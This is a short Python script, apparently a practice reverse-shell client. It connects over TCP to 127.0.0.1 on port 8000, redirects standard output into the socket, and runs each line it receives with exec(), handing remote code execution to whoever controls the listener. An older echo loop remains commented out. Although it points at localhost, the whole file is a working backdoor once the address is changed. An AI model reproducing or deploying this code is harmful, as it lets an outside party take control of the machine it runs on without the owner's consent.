import socket
import subprocess
import sys

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8000))

    '''
    while True:
        command = s.recv(1024).decode()
        if 'exit' in command:
            s.close()
            break
        elif 'hello' in command:
            s.send('hello back ;)'.encode())
        else:
            s.send(command.encode())
    '''
    sockFile = s.makefile(mode='wr')
    while True:
        sys.stdout = sockFile
        command = sockFile.readline()
        if 'exit' in command:
            break

        print("exec command")
        exec(command)
        #s.sendall(command.encode())
        #print('Sent hello back')
    sockFile.close()

connect()
